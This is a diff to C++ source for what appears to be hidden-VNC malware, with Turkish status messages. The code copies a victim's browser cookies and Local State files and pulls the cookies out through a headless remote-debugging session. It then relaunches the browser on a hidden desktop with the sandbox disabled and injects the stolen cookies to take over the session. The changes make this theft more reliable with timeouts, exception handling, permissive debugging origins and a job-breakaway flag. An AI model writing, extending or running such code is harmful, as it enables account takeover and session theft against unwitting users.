@@ -56,6 +56,10 @@ struct CDPClient {
         sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if (sock == INVALID_SOCKET) return false;
 
+        DWORD timeout = 5000;
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
+
         sockaddr_in addr;
         addr.sin_family = AF_INET;
         addr.sin_port = htons(port);
@@ -96,6 +100,10 @@ struct WSClient {
         host = h; port = p; path = pt;
         sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if (sock == INVALID_SOCKET) return false;
+
+        DWORD timeout = 5000;
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
 
         sockaddr_in addr;
         addr.sin_family = AF_INET;
@@ -1371,6 +1379,10 @@ static void launch_browser_thread(wstring browser_name) {
         return;
     }
 
+    namespace fs = std::filesystem;
+    fs::path browser_exe(browser_path);
+    wstring browser_dir = browser_exe.parent_path().wstring();
+
     send_status("profiller kopyalanıyor...");
 
     // 1. Extract cookies from the running browser on the default desktop
@@ -1384,24 +1396,28 @@ static void launch_browser_thread(wstring browser_name) {
     int extract_port = 9222;
     wstring extract_cmd = L"\"" + browser_path + L"\" --remote-debugging-port=" + to_wstring(extract_port) + L" --headless --disable-gpu about:blank";
 
-    // Fallback: If original profile is locked, create a mini bridge profile
     wstring bridge_dir = L"";
     if (!source_path.empty()) {
         wchar_t temp[MAX_PATH]; GetTempPathW(MAX_PATH, temp);
         bridge_dir = wstring(temp) + L"hvnc_bridge_" + to_wstring(GetTickCount());
-        std::filesystem::create_directories(bridge_dir + L"\\Default\\Network");
-        CopyFileW((source_path + L"\\Local State").c_str(), (bridge_dir + L"\\Local State").c_str(), FALSE);
-        CopyFileW((source_path + L"\\Default\\Cookies").c_str(), (bridge_dir + L"\\Default\\Cookies").c_str(), FALSE);
-        CopyFileW((source_path + L"\\Default\\Network\\Cookies").c_str(), (bridge_dir + L"\\Default\\Network\\Cookies").c_str(), FALSE);
-        CopyFileW((source_path + L"\\Default\\Preferences").c_str(), (bridge_dir + L"\\Default\\Preferences").c_str(), FALSE);
-        extract_cmd += L" --user-data-dir=\"" + bridge_dir + L"\"";
+        try {
+            fs::create_directories(fs::path(bridge_dir) / L"Default/Network");
+            CopyFileW((source_path + L"\\Local State").c_str(), (bridge_dir + L"\\Local State").c_str(), FALSE);
+            CopyFileW((source_path + L"\\Default\\Cookies").c_str(), (bridge_dir + L"\\Default\\Cookies").c_str(), FALSE);
+            CopyFileW((source_path + L"\\Default\\Network\\Cookies").c_str(), (bridge_dir + L"\\Default\\Network\\Cookies").c_str(), FALSE);
+            CopyFileW((source_path + L"\\Default\\Preferences").c_str(), (bridge_dir + L"\\Default\\Preferences").c_str(), FALSE);
+            extract_cmd += L" --user-data-dir=\"" + bridge_dir + L"\"";
+        } catch(...) {}
     }
 
     vector<wchar_t> exCmdVec(extract_cmd.begin(), extract_cmd.end());
     exCmdVec.push_back(L'\0');
 
-    STARTUPINFOW si_ex = { sizeof(si_ex) };
-    PROCESS_INFORMATION pi_ex = { 0 };
+    STARTUPINFOW si_ex;
+    PROCESS_INFORMATION pi_ex;
+    memset(&si_ex, 0, sizeof(si_ex));
+    memset(&pi_ex, 0, sizeof(pi_ex));
+    si_ex.cb = sizeof(si_ex);
     json cookies = json::array();
     if (CreateProcessW(NULL, exCmdVec.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_ex, &pi_ex)) {
         for (int i = 0; i < 10; i++) {
@@ -1413,7 +1429,7 @@ static void launch_browser_thread(wstring browser_name) {
         CloseHandle(pi_ex.hProcess);
         CloseHandle(pi_ex.hThread);
     }
-    if (!bridge_dir.empty()) std::filesystem::remove_all(bridge_dir);
+    if (!bridge_dir.empty()) { try { fs::remove_all(bridge_dir); } catch(...) {} }
 
     // 2. Prepare fresh profile for hidden desktop
     wstring target_data_dir;
@@ -1426,19 +1442,25 @@ static void launch_browser_thread(wstring browser_name) {
 
     // 3. Launch browser on hidden desktop
     int hidden_port = 9223;
-    wstring cmdLine = L"\"" + browser_path + L"\" --user-data-dir=\"" + target_data_dir + L"\" --no-sandbox --disable-gpu --password-store=basic --remote-debugging-port=" + to_wstring(hidden_port) + L" --disable-features=RendererCodeIntegrity --no-first-run --no-default-browser-check --disable-sync --disable-extensions";
+    wstring cmdLine = L"\"" + browser_path + L"\" --user-data-dir=\"" + target_data_dir +
+                      L"\" --no-sandbox --disable-gpu --password-store=basic --remote-debugging-port=" + to_wstring(hidden_port) +
+                      L" --disable-features=RendererCodeIntegrity --no-first-run --no-default-browser-check --disable-sync --disable-extensions " +
+                      L" --remote-allow-origins=* --window-size=1920,1080 --start-maximized --disable-infobars --disable-notifications";
     vector<wchar_t> cmdVec(cmdLine.begin(), cmdLine.end());
     cmdVec.push_back(L'\0');
 
     wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-    STARTUPINFOW si = { sizeof(si) };
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    memset(&si, 0, sizeof(si));
+    memset(&pi, 0, sizeof(pi));
+    si.cb = sizeof(si);
     si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
     si.dwFlags      = STARTF_USESHOWWINDOW;
     si.wShowWindow  = SW_SHOW;
-
-    PROCESS_INFORMATION pi = { 0 };
     if (CreateProcessW(NULL, cmdVec.data(), NULL, NULL, FALSE,
-                       CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
+                       CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB,
+                       NULL, browser_dir.c_str(), &si, &pi)) {
         // 4. Inject extracted cookies
         if (!cookies.empty()) {
             for (int i = 0; i < 15; i++) {
